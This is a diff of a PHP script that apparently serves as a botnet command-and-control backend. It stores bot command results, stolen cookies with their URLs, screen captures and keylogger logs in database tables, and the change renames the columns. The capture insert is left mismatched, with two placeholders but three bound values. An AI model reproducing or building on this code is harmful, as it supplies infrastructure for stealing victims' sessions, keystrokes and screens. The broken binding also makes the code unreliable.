@@ -9,19 +9,20 @@ $idbot = $_REQUEST["idbot"];
 $detail = $_REQUEST["detail"];
 $content = $_REQUEST["content"];
 if ($table == "cmd") {
-    $query = "INSERT INTO cmd(IDbot,cmd,getcmd) VALUES(?,?,?)";
+    $query = "INSERT INTO cmd(IdBot,Cmd,CmdResult) VALUES(?,?,?)";
     $stmt = $db->prepare($query);
     $stmt->bind_param('sss', $idbot, $detail, $content);
     $stmt->execute();
 } else if ($table == "cookies") {
-    $query = "INSERT INTO cookies(IDbot,link,getcookies) VALUES(?,?,?)";
+
+    $query = "INSERT INTO cookies(IdBot,Url,CookiesResult) VALUES(?,?,?)";
     $stmt = $db->prepare($query);
     $stmt->bind_param('sss', $idbot, $detail, $content);
     $stmt->execute();
 } else if ($table == "capture") {
     $currentDateTime = new DateTime();
     $currentDateTimeStr = $currentDateTime->format('Y-m-d H:i:s');
-    $query = "INSERT INTO capture (IDbot, getcapture, timecapture) VALUES (?, ?, ?)";
+    $query = "INSERT INTO capture (IdBot, CaptureResult) VALUES (?, ?)";
     $stmt = $db->prepare($query);
     $stmt->bind_param('sss', $idbot, $content, $currentDateTimeStr);
     $stmt->execute();
@@ -33,7 +34,7 @@ if ($table == "cmd") {
     $dateTimeStop = date_create($timeStop);
     $dateTimeStartStr = $dateTimeStart->format('Y-m-d H:i:s');
     $dateTimeStopStr = $dateTimeStop->format('Y-m-d H:i:s');
-    $query = "INSERT INTO keylogger(IDbot,getkeylog,timestart,timestop) VALUES (?, ?, ?, ?)";
+    $query = "INSERT INTO keylogger(IdBot,KeyloggerResult,TimeStart,TimeStop) VALUES (?, ?, ?, ?)";
     $stmt = $db->prepare($query);
     $stmt->bind_param('ssss', $idbot, $content, $dateTimeStartStr, $dateTimeStopStr);
     $stmt->execute();
